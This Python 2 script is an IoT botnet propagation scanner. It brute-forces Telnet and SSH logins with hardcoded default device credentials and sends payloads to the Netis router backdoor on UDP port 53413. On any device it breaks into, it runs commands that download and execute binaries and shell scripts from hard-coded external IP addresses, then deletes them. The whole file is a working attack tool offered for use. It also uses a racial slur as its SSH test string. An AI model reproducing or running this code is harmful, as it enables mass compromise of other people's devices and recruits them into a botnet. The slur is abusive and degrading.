#!/usr/bin/python
""" 
	GoD-MuLTi-ScaNNeR(NeTiS/TeLNeT/SSH) 
			By; LiGhT
"""
import threading, sys, time, random, socket, re, os, paramiko
from Queue import *
from sys import stdout

if len(sys.argv) < 4:
	print "GoD-MuLTi-ScaNNeR\n    By: LiGhT"
	print "Usage: python "+sys.argv[0]+" <threads(1-100)> <ips per scan(100-1000)> <list>"
	sys.exit()

# USER AND PASS LISTS #
usernames = ["root", "admin", "root", "root"] #DONT CHANGE
passwords = ["oelinux123", "admin", "Zte521", "vizxv"] #DONT CHANGE
ssh_passwords = ["admin:1234", "root:1234"] #CAN CHANGE
loginpayload = "AAAAAAAAnetcore\x00" #DONT CHANGE


# START CONFIGURATION #
url = "http://103.194.169.245/tftp" # ARM4 Binary
sh_file = "http://89.34.99.189/bins.sh" # SH File
commandpayload = "cd /tmp; wget http://89.34.99.189/bins.sh || curl -O http://89.34.99.189/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 89.34.99.189 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 89.34.99.189; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh" # MIPSEL Binary

# DONT TOUCH
spawn_shell = "cat | sh"
paramiko.util.log_to_file("/dev/null") #quiets paramiko output
threads = int(sys.argv[1])
h0h0 = int(sys.argv[2])
ips = open(sys.argv[3], "r").readlines()
queue = Queue()
qcount = 0
binary = url.split("/")
binary = binary[3]
ip = binary[2]

for ip in ips:
	qcount += 1
	stdout.write("\r[%d] Added to queue" % qcount)
	stdout.flush()
	queue.put(ip)
print "\n"

def readUntil(tn, string, timeout=10):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				if queue.empty() == True:
					sys.exit(1)
				iplist = []
				h0h0h0 = h0h0 + 1
				print "\033[33mGathering IPs\033[37m"%(ip.rstrip("\n"))
				for x in xrange(h0h0h0):
					ip = queue.get()
					iplist.append(ip)
					print "\033[33mIP Address Obtained \033[32m%s\033[37m"%(ip.rstrip("\n"))
					queue.task_done()
				time.sleep(1.5)
				print "\033[36mStarting SSH Threads\033[37m"
				for ip in iplist:
					ss = sssh(ip)
					ss.start()
					time.sleep(0.009)
				time.sleep(1)
				print "\033[32mStarting Telnet Threads\033[37m"
				for ip in iplist:
					tt = ttelnet(ip)
					tt.start()
					time.sleep(0.009)
				time.sleep(1)
				print "\033[35mStarting Netis Threads\033[37m"
				for ip in iplist:
					nn = nnetis(ip)
					nn.start()
					time.sleep(0.009)
				time.sleep(1)
			except:
				print "\033[31mWORKER ERROR\033[37m" #will fuk up if more threads/workers then ips in list
				pass
	except:
		pass

class ttelnet(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				tn = socket.socket()
				tn.settimeout(5)
				tn.connect((self.ip,23))
				time.sleep(0.2)
				hoho = ''
				hoho += readUntil(tn, ":")
				if "mdm9625" in hoho:
					notr00t = 1
					username = usernames[1]
					password = passwords[1]
					tn.send(username + "\n")
				elif "9615-cdp" in hoho:
					r00t = 1
					username = usernames[0]
					password = passwords[0]
					tn.send(username + "\n")
				if "F600" in hoho:
					zte = 1
					username = usernames[2]
					password = passwords[2]
					tn.send(username + "\n")
				elif "F660" in hoho:
					zte = 1
					username = usernames[2]
					password = passwords[2]
					tn.send(username + "\n")
				elif "F609" in hoho:
					zte = 1
					username = usernames[2]
					password = passwords[2]
					tn.send(username + "\n")
				if "(none)" in hoho:
					vizxv = 1
					username = usernames[3]
					password = passwords[3]
					tn.send(username + "\n")
				if "BCM" in hoho:
					BCM = 1
					username = usernames[1]
					password = passwords[1]
					tn.send(username + "\n")
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, ":")
				if "assword" in hoho:
					tn.send(password + "\n")
					time.sleep(3)
			except Exception:
				tn.close()
			try:
				mp = ''
				mp += tn.recv(1024)
				if "#" in mp or "$" in mp or "~" in mp or ">" in mp or "root@" in mp: # !DO NOT CHANGE ANYTHING! #
					if r00t: tn.send("cd /tmp; wget "+url+" -O phone; chmod 777 phone; ./phone; rm -rf phone" + "\n"); print "\033[32m[PHONE] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if notr00t: tn.send("su" + "\n"); readUntil(tn, "Password:"); tn.send(passwords[0] + "\n"); time.sleep(1); tn.send("cd /tmp; wget "+url+" -O phone; chmod 777 phone; ./phone; rm -rf phone" + "\n"); print "\033[32m[PHONE] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if zte: tn.send("cd /var/; rm -rf busybox filename; wget "+url+" -O filename ; cp /bin/busybox ./; busybox cat filename > busybox;./busybox ;rm -rf busybox filename" + "\n"); print "\033[32m[ZTE] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if vizxv: tn.send("cd /var/ || cd /tmp/ || cd /dev/; tftp -r "+binary+" -g "+ip+"; chmod 777 "+binary+"; ./"+binary+"; rm -rf "+binary+""); print "\033[32m[VIZXV] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if BCM: tn.send(spawn_shell + "\n"); time.sleep(1); tn.send("cd /tmp; wget "+sh_file+" -O l.sh; sh l.sh; rm -rf /tmp/*" + "\n"); print "\033[32m[BCM] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
			except Exception:
				tn.close()
				pass

class nnetis(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
			print "\033[35m[NETIS] Payload Sent %s"%(self.ip)
			s.sendto(loginpayload, (self.ip, 53413))
			time.sleep(1)
			s.sendto(commandpayload, (self.ip, 53413))
			time.sleep(1)
		except Exception:
			pass

class sssh(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		x = 1
		while x != 0:
			try:
				username='root'
				password="0"
				port = 22
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				dobreak=False
				for passwd in ssh_passwords:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
						dobreak=True
						break
					except:
						pass
					if True == dobreak:
						break
				badserver=True
				stdin, stdout, stderr = ssh.exec_command("echo nigger")
				output = stdout.read()
				if "nigger" in output:
					badserver=False	
				if badserver == False:
					print "\033[36m[SSH] Command Sent %s!\033[37m"%(self.ip)
					ssh.exec_command("cd /tmp || cd /var/run || cd /dev; wget "+sh_file+" -O l.sh; sh l.sh; rm -rf /tmp/*")
					time.sleep(3)
					ssh.close()
					x = 0
				if badserver == True:
					ssh.close()
			except:
				pass
			x = 0

for g in xrange(threads):
	t = threading.Thread(target=worker)
	t.setDaemon(True)
	t.start()
	time.sleep(0.001)
	
queue.join()
print "Finished!"